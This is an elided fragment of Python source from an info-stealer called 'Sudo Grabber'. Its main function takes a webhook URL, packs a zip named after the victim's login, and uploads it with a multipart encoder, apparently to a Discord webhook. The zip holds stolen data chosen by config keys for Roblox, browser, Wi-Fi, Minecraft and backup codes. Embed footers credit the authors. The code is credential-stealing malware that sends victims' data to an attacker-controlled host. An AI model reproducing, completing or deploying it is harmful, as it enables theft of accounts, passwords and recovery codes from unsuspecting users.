...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\Sudo-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Sudo-Logged-{os.getlogin()}.zip', file, 'application/zip')})
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Sudo Grabber | Created By Bantorbann"
                    },
                    "thumbnail": {
                ...
                "embeds": [
                    {
                        ...
                        "footer": {
                            "text": "Sudo Grabber | Created By Smug"
                        },
                    }
                ],
                "username": "Sudo",
